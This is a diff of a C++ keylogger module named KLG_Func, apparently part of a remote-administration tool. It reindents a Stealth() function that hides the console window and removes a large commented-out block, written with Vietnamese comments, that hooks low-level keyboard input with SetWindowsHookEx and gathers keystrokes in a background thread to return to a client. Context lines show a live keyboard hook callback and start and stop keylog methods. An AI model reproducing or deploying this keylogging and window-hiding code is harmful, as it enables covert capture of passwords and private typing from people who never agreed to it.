@@ -1,7 +1,4 @@
 #include "KLG_Func.h"
-#include "utils.h"
-#include "DataObj/DataObj.h"
-
 
 // defines whether the window is visible or not
 // should be solved with makefile, not in this file
@@ -13,7 +10,6 @@
 #define mouseignore
 // variable to store the HANDLE to the hook. Don't declare it anywhere else then globally
 // or you will get problems since every function uses this variable.
-
 
 #if FORMAT == 0
 const std::map<int, std::string> keyname{
@@ -65,7 +61,6 @@ std::vector<std::string> keylog;
 void ReleaseHook();
 LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam)
 {
-	
 	if (nCode >= 0)
 	{
 		// the action is valid: HC_ACTION.
@@ -189,13 +184,13 @@ int Save(int key_stroke)
 }
 void Stealth()
 {
-#ifdef visible
-	ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 1); // visible window
-#endif
+	#ifdef visible
+		ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 1); // visible window
+	#endif
 
-#ifdef invisible
-	ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 0); // invisible window
-#endif
+	#ifdef invisible
+		ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 0); // invisible window
+	#endif
 }
 
 
@@ -282,148 +277,4 @@ std::string KLG_Func::stopKeylog()
 	else res = "Keylogging is not running";
 	return res;
 }
-
-
-
-//bool KLG_Func::keylogging = false;
-//HHOOK KLG_Func::hook = NULL;
-//std::vector<int> keylog;
-//
-//LRESULT KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
-//{
-//	if (nCode < 0) { // Bỏ qua các thông điệp khác nếu nCode < 0
-//		return CallNextHookEx(NULL, nCode, wParam, lParam);
-//	}
-//	
-//
-//	if (wParam == WM_KEYDOWN)
-//	{
-//		// Lấy thông tin về sự kiện phím
-//		KBDLLHOOKSTRUCT* pkbhs = reinterpret_cast<KBDLLHOOKSTRUCT*>(lParam);
-//
-//		// Nếu là sự kiện nhấn phím, lưu phím vào biến tạm
-//		keylog.push_back(pkbhs->vkCode);
-//		std::cout << pkbhs->vkCode;
-//	}
-//
-//	// Gọi hàm xử lý sự kiện tiếp theo trong chuỗi xử lý
-//	return CallNextHookEx(NULL, nCode, wParam, lParam);
-//}
-///*
-//std::shared_ptr<DataObj> KLG_Func::keylogger()
-//{
-//    std::string res = "";
-//	std::shared_ptr<DataObj> MES(new DataObj(utils::CurrentTime(), DataType::RESPONSE, FuncType::KLG, CmdType::DATA, res));
-//
-//	// Thiết lập hook để bắt sự kiện phím
-//	HHOOK hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
-//	// Nếu không thiết lập hook thành công, báo lỗi và thoát chương trình
-//	if (!hook)
-//	{
-//		std::cout << "Error setting keyboard hook: " << GetLastError() << std::endl;
-//		
-//		// Đóng socket và giải phóng thư viện Winsock
-//		// ...
-//        
-//		res = "Hook failed.";
-//	}
-//    else
-//    {
-//        while (!checkStopSignal())
-//        {
-//            // Nếu đã bắt được ít nhất một phím, gửi danh sách các phím đã bắt được đến client
-//            if (!keylog.empty())
-//            {
-//                // Ghép các phím đã bắt được thành một chuỗi
-//                for (auto key : keylog)
-//                {
-//                    res += (char(key));
-//                }
-//
-//                // Xóa danh sách các phím đã bắt được
-//                keylog.clear();
-//            }
-//
-//            // Chờ 1 giây trước khi kiểm tra lại
-//            Sleep(1000);
-//        }
-//
-//        // Huỷ hook
-//        UnhookWindowsHookEx(hook);
-//    }
-//
-//    MES->setData(res);
-//	
-//	return MES;
-//}
-//*/
-//void KLG_Func::KeylogThreadFunc(std::string& res)
-//{
-//	/*MSG msg;
-//	while (GetMessage(&msg, NULL, 0, 0))
-//	{
-//		TranslateMessage(&msg);
-//		DispatchMessage(&msg);
-//		std::cout << "1";
-//	}*/
-//
-//
-//	for (int key : keylog)
-//	{
-//		std::cout << std::to_string(key);
-//		res += std::to_string(key);
-//	}
-//
-//	keylog.clear();
-//	
-//}
-//
-//std::shared_ptr<DataObj> KLG_Func::startKeylog()
-//{
-//	std::string res = "Start";
-//	std::shared_ptr<DataObj> MES(new DataObj(utils::CurrentTime(), DataType::RESPONSE, FuncType::KLG, CmdType::DATA, res));
-//	if (!keylogging)
-//	{
-//		HINSTANCE hInstance = GetModuleHandle(NULL);
-//
-//		// Thiết lập hook để bắt sự kiện phím
-//		hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
-//		// Nếu không thiết lập hook thành công, báo lỗi và thoát chương trình
-//		if (!hook)
-//		{
-//			std::cout << "Error setting keyboard hook: " << GetLastError() << std::endl;
-//
-//			// Đóng socket và giải phóng thư viện Winsock
-//			// ...
-//
-//			res = "Hook failed.";
-//		}
-//		else
-//		{
-//			keylogging = true;
-//			std::thread keylogThread(KeylogThreadFunc, std::ref(res));
-//			keylogThread.detach();
-//		}
-//	}
-//	else res = "Keylogging is already running";
-//	MES->setData(res);
-//	return MES;
-//}
-//
-//std::shared_ptr<DataObj> KLG_Func::stopKeylog()
-//{
-//	std::string res = "Stop";
-//	std::shared_ptr<DataObj> MES(new DataObj(utils::CurrentTime(), DataType::RESPONSE, FuncType::KLG, CmdType::DATA, res));
-//
-//	if (keylogging)
-//	{
-//		UnhookWindowsHookEx(hook);
-//		keylogging = false;
-//		res = "Keylogging stopped";
-//	}
-//	else res = "Keylogging is not running";
-//	MES->setData(res);
-//	return MES;
-//}
-
 
